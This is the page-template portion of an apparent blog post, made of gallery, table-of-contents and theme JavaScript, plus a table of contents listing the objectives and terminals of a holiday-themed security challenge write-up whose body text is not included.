            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      
    </div>
  </div>
</main>


<aside class="single__side main-side">
  


<section class="sidebar hide">
  <script>document.querySelector('.sidebar').classList.remove('hide')</script>
  <div class="toc__flexbox" data-position="fixed">
    <h6 class="toc__title" data-ani="true">What&#39;s on this Page</h6>
    
  </div>
  <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#prologue">Prologue</a></li>
    <li><a href="#objectives">Objectives</a>
      <ul>
        <li><a href="#1---uncover-santas-giftlist">1 - Uncover Santa&rsquo;s Gift List</a></li>
        <li><a href="#2---investigate-s3bucket">2 - Investigate S3 Bucket</a></li>
        <li><a href="#3---point-of-sale-passwordrecovery">3 - Point-of-Sale Password Recovery</a></li>
        <li><a href="#4---operate-the-santavator">4 - Operate the Santavator</a></li>
        <li><a href="#5---open-hidlock">5 - Open HID Lock</a></li>
        <li><a href="#6---splunk-challenge">6 - Splunk Challenge</a></li>
        <li><a href="#7---solve-the-sleighs-can-d-bus-problem">7 - Solve the Sleigh&rsquo;s CAN-D-BUS Problem</a></li>
        <li><a href="#8---broken-tag-generator">8 - Broken Tag Generator</a></li>
        <li><a href="#9---arp-shenanigans">9 - ARP Shenanigans</a></li>
        <li><a href="#10---defeat-fingerprint-sensor">10 - Defeat Fingerprint Sensor</a></li>
        <li><a href="#11a---naughtynice-list-with-blockchain-investigation-part1">11a - Naughty/Nice List with Blockchain Investigation Part 1</a></li>
        <li><a href="#11b---naughtynice-list-with-blockchain-investigation-part2">11b - Naughty/Nice List with Blockchain Investigation Part 2</a></li>
      </ul>
    </li>
    <li><a href="#epilogue">Epilogue</a></li>
    <li><a href="#cranpi-terminals">CranPi Terminals</a>
      <ul>
        <li><a href="#1---kringle-kiosk">1 - Kringle Kiosk</a></li>
        <li><a href="#2---linux-primer">2 - Linux Primer</a></li>
        <li><a href="#3---unescapetmux">3 - Unescape Tmux</a></li>
        <li><a href="#4---speaker-unprep">4 - Speaker UNprep</a></li>
        <li><a href="#5---can-bus-investigation">5 - CAN-Bus Investigation</a></li>
        <li><a href="#6---redis-bughunt">6 - Redis Bug Hunt</a></li>
        <li><a href="#7---scapy-prepper">7 - Scapy Prepper</a></li>
      </ul>
    </li>
    <li><a href="#side-quests">Side Quests</a>
      <ul>
        <li><a href="#the-336kbps-modem">The 33.6kbps Modem</a></li>
        <li><a href="#the-sort-o-matic">The Sort-O-Matic</a></li>
        <li><a href="#the-elf-c0de">The Elf C0de</a></li>
        <li><a href="#snowball-game">Snowball Game</a></li>
      </ul>
    </li>
    <li><a href="#items">Items</a></li>
    <li><a href="#christmas-eggs">Christmas Eggs</a></li>
    <li><a href="#additional-ressources">Additional Ressources</a>
      <ul>
        <li>
          <ul>
            <li><a href="#objective-3">Objective 3</a></li>
            <li><a href="#objective-6">Objective 6</a></li>
            <li><a href="#objective-8">Objective 8</a></li>
            <li><a href="#objective-10">Objective 10</a></li>
            <li><a href="#objective-11a">Objective 11a</a></li>
            <li><a href="#objective-11b">Objective 11b</a></li>
            <li><a href="#cranpi-terminal-7">CranPi Terminal 7</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</section>



</aside>

<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"inner\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>





<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script defer src="/js/helper/throttle.min.js"></script>



















































<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    



    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("true");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      tableOfContentsElem.onmouseenter = function() {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      tableOfContentsElem.onmouseleave = function() {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.add('scrolling');
        }
      }

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');

              if (!navbar.classList.contains('scrolling')) {
                navbar.classList.remove('navbar--show');
                navbar.classList.remove('navbar--hide');
                navbar.classList.add('navbar--hide');
              }
              
              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    
    
    
    
    
    var topOffset = 120;
    var botOffset = 70;
    var handleWindowResize = function () {
      if (tocElem) {
        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
      }
    }
    var throttledWindowResize = throttle(handleWindowResize, 300);
    throttledWindowResize()

    
    window.addEventListener('resize', throttledWindowResize);
    



    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var size = parseInt(elem.tagName.substr(1), 10) * 2;
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.left = '0.75rem';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerHTML = `
<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    // =================================================================



    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    

    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    



    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    

    

    
    document.querySelectorAll("mjx-container").forEach(function (x) {
      x.parentElement.classList += 'has-jax'
    });
    



    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    



    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
